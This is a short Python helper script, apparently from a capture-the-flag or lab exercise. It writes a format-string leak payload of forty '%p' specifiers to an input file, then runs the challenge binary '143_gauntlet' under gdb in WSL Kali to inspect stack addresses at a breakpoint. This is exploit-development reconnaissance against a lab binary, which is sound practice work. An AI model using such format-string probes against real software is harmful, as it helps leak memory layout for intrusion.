import sys, socket, time, re, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = "/mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps"
# entree : format string puis ligne bidon
fmt = ".".join(["%p"] * 40)
with open(CWD + "/in143.txt", "w") as f:
    f.write(fmt + "\n")
    f.write("AAAA\n")
gdb_script = """set pagination off
break *0x40124f
run < in143.txt
printf "rbp-0x70 = %p\\n", $rbp-0x70
printf "rbp = %p\\n", $rbp
x/4gx $rbp-0x70
quit
"""
open(CWD + "/g143.gdb", "w").write(gdb_script)
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps && "
                      "chmod +x 143_gauntlet && gdb -nx -q -batch -x g143.gdb ./143_gauntlet 2>&1 | head -30"],
                     capture_output=True, text=True).stdout
print(out)
